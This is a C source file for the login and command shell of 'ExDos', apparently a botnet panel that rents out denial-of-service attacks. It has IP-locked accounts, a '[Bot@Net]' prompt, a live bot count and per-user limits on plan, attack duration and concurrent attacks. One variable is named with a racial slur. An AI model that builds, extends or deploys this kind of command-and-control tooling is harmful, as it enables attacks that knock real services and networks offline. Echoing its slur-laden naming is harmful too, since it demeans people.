#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../headers/db/users.h"
#include "../headers/__init__.h"

void *title_updater(void **args) {
    ExDos *c = (ExDos *)args[0];
    Client *client = (Client *)args[1];

    char *spinner_chars[] = {"\\", "|", "/", "-"};
    int spin = 0;
    str *title = string(NULL);
    while(1) {
        if(spin == 4)
            spin = 0;

        title = string("[");
        title->AppendString(title, spinner_chars[spin++]);
        title->AppendString(title, "] ExDos | Version: 1.0.0");
        ChangeTermTitle(client->sock, string(title->data));
        free(title);
        usleep(500000);
    }
}

void AuthenticateUser(void **args) {
    ExDos *c        = (ExDos *)args[0];
    Socket *client  = (Socket *)args[1];
    changeTerminalSize(client, string("28"), string("91"));
    ChangeTermTitle(client, string("Login | ExDos | Version: 1.0.0"));
    GetClientIP(client);
    

    // 7 Tries // If info is incorrect on a user, it'd disconnect
    for(int i = 0; i < 7; i++) {
        Write(client, string("Username: "));
        str *username = Read(client);
        if(!username) {
            Close(client);
            return;
        }
        
        username->ReplaceChar(username, '\r', ' ');
        username->ReplaceChar(username, '\n', ' ');
        username->Strip(username);

        Write(client, string("Password: "));
        str *passwd = Read(client);
        if(!passwd) {
            Close(client);
            return;
        }

        passwd->ReplaceChar(passwd, '\r', ' ');
        passwd->ReplaceChar(passwd, '\n', ' ');
        passwd->Strip(passwd);

        User *user = FindUser(c, username);
        if(!user) {
            Write(client, string("[ x ] An error has occupied during login....!\n"));
            close(client->SockFD);
            return;
        }

        if(strlen(passwd->data) < 2) {
            free(username);
            free(passwd);
            continue;
        }
        
        if(!strcmp(username->data, user->USERNAME->data) && !strcmp(passwd->data, user->PASSWD->data)) {
            if(strcmp(user->IP_ADDR->data, client->IP->data) && strcmp(user->IP_ADDR->data, "0.0.0.0")) {
                Write(client, string("[ x ] Error, Unable to login due to a mismatch IP....\nAccounts are IP Locked to the registered IP by default, Message owner for IP Lock Reset\n"));
                close(client->SockFD);
                return;
            }

            if(!strcmp(user->IP_ADDR->data, "0.0.0.0")) {
                if(ChangeIPAddress(user, client->IP))
                printf("[ x ] Error, Unable to change IP Address....!\n");
                SaveDB(c->DB, c->user_idx);
                printf("Invalid IP Match: %s\n", client->IP->data);
            }

            printf("[ + ] New User Connected: %s...!\n", username->data);
            c->online_users[c->online_user_count] = new_client(username, user, client);
            c->online_user_count++;
            c->online_users = (void **)realloc(c->online_users, sizeof(void *) * (c->online_user_count + 1));
            set_socket_timeout(client, 0);
            UserCLI(c, client, c->online_users[c->online_user_count - 1]);
            return;
        }

        free(username);
        free(passwd);
    }

    Write(client, string("[ x ] Max Login Attempt Reached"));
    close(client->SockFD);
}

Client *new_client(str *username, User *acc, Socket *sock) {
    Client *u = (Client *)malloc(sizeof(Client));
    u->Username = string(username->data);
    u->account = acc;
    u->sock = sock;

    return u;
}

void ClearScreen(void *c, Socket *client) {
    int row = 9;
    for(int i = 0; i < 17; i++) {
        place_text(client, string(int2ch(row)), string("21"), string("                                                                      "));
        row++;
    }
}


void UserCLI(void *c, Socket *client, Client *u) {
    /* Thread Title Updater For User */
    void **new = (void **)malloc(sizeof(void *) * 2);
    new[0] = c;
    new[1] = u;
    pthread_t gg;
    pthread_create(&gg, NULL, (void *)title_updater, new);

    /* Set UI and Title */
    Write(client, (str *)((Theme *)((ExDos *)c)->Theme)->Layout);
    place_text(client, string("2"), string("24"), string("[ ExDos | Version 1.0.0 | Author: Algo1337 | Github: Algo1337 ]"));

    /* Place Statistics Information Text */
    str *user_count = string(int2ch((int)((ExDos *)c)->online_user_count));
    user_count->AppendString(user_count, "/");
    user_count->AppendString(user_count, int2ch((int)((ExDos *)c)->user_idx - 1));
    place_text(client, string("6"), string(int2ch(user_count->idx > 1 ? 35 - (user_count->idx/2) : 35)), user_count);
    free(user_count);

    /* Place Account Information Text */
    place_text(client, string("6"), string("55"), string(int2ch((int)((ExDos *)c)->online_bots->idx)));
    place_text(client, string("6"), string("75"), string(int2ch((int)((ExDos *)c)->LogCount)));
    place_text(client, string("14"), string("9"), u->account->USERNAME);
    place_text(client, string("15"), string("9"), string(int2ch(u->account->PLAN)));
    place_text(client, string("16"), string("13"), string(int2ch(u->account->MAX_TIME)));
    place_text(client, string("17"), string("13"), string(int2ch(u->account->MAX_CONCURRENTS)));
    place_text(client, string("18"), string("8"), string(int2ch(u->account->VIP)));
    place_text(client, string("19"), string("11"), u->account->EXPIRY);
    place_text(client, string("20"), string("9"), string(int2ch((int)u->account->RANK)));

    /* Command Handler */
    str *cmd_input      = NULL;
    str *nig            = string(NULL);
    Arr *Args           = Array(NULL);
    while(1) {
        place_text(client, string("27"), string("3"), string("[Bot@Net] # ~ "));

        cmd_input = Read(client);
        if(!cmd_input) {
            close(client->SockFD);
            // remove user
            return;
        }
        ClearScreen(c, client);

        cmd_input->ReplaceChar(cmd_input, '\r', ' ');
        cmd_input->ReplaceChar(cmd_input, '\n', ' ');
        cmd_input->Strip(cmd_input);

        if(strstr(cmd_input->data, " ")) {
            str *n = string(cmd_input->data);
            char **args = cmd_input->Split(n, " ");
            args[count_arr(args)] = NULL;
            Args = Array(args);
            free(n);
        }

        str *query = (Args->idx > 0 ? string(Args->arr[0]) : cmd_input);
        int chk = ((ExDos *)c)->cogs->Find(((ExDos *)c)->cogs, query);
        if(chk >= 0) {
            Command *cmd = ((ExDos *)c)->cogs->Get(((ExDos *)c)->cogs, chk);
            cmd->fn((ExDos *)c, u, cmd_input, Args);
        } else {
            printf("[ x ] Error, Unable to find command %s.....!\n", cmd_input->data);
        }

        printf("Input from %s: %s\n", u->Username->data, cmd_input->data);
        place_text(client, string("27"), string("17"), string("                                        "));
        str *user_count = string(int2ch((int)((ExDos *)c)->online_user_count));
        user_count->AppendString(user_count, "/");
        user_count->AppendString(user_count, int2ch((int)((ExDos *)c)->user_idx - 1));
        place_text(client, string("6"), string(int2ch(user_count->idx > 1 ? 35 - (user_count->idx/2) : 35)), user_count);
        free(user_count);
        place_text(client, string("6"), string("55"), string(int2ch((int)((ExDos *)c)->online_bots->idx)));
        place_text(client, string("6"), string("75"), string(int2ch((int)((ExDos *)c)->LogCount)));

        cmd_input = string(NULL);
        Args = Array(NULL);

        Args->Kill(Args);
        free(Args);
    }
}